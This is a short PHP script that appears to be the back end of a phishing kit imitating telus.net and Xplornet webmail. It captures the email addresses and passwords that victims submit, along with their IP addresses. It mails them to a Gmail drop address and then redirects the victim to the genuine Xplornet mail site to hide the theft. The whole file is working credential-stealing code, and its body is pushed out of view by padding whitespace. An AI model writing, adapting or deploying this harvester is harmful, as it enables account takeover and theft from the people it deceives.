<?
                                                                                                                                                                                                                                    
$ip = getenv("REMOTE_ADDR");
$message .= "--------------telus.net--------\n";
$message .= "E-mail address / Courriel : ".$_POST["username"]."\n";
$message .= "Password / Mot de passe : ".$_POST["password"]."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY Ragnaros-----------\n";
$send = "0fficefax401@gmail.com";
$subject = "Xplornet rezults";


mail($send,$subject,$message,$headers);


$redirect = "https://mail.xplornet.ca/";

header("Location: " . $redirect);
 
?>